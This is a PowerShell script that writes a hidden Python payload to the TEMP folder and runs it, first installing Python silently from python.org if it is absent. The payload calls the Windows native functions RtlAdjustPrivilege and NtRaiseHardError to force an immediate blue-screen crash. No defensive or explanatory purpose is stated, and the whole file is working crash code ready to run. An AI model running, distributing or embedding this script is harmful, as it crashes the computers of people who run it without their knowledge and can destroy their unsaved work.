# Define the Python script content
$pythonScript = @"
def BSOD():
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref
    
    nullptr = POINTER(c_int)()
  
    windll.ntdll.RtlAdjustPrivilege(c_uint(19) , c_uint(1) , c_uint(0) , byref(c_int()))
    
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B) , c_ulong(0) , nullptr , nullptr , c_uint(6) , byref(c_uint()))
BSOD()
"@

# Set the filename for the Python script
$pyFile = "$env:TEMP\embedded_script.py"

# Check if Python is installed
$pythonInstalled = Get-Command python -ErrorAction SilentlyContinue

if (-not $pythonInstalled) {
    Write-Host "Python is not installed. Installing Python..."

    # Define Python installer URL (modify for the latest version)
    $installerUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download Python installer
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
}

# Save the Python script to a file
Set-Content -Path $pyFile -Value $pythonScript

# Run the Python script
Start-Process -FilePath "python" -ArgumentList $pyFile -Wait